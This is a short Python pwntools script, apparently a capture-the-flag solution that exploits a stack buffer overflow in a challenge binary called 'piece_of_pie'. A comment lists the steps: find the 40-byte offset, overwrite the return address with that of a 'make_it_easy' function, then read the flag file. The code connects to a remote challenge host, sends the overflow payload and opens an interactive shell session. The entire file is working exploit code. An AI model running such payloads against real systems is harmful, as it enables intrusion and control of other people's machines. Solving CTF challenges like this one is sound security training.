from pwn import *

"""
pattern create, find offset relative to EBP at 32
=> return address at 40
find make_it_easy address (0x400656)
run script
cat /home/ctf/flag
"""

context(arch='amd64', os='linux')

io = remote("141.85.224.101", 31337)
# io = process("./piece_of_pie")

target = 0x400656

payload = "A" * 40 + p64(target)
open("payload", "wt").write(payload)

io.sendline(payload)
io.recv()
io.interactive()
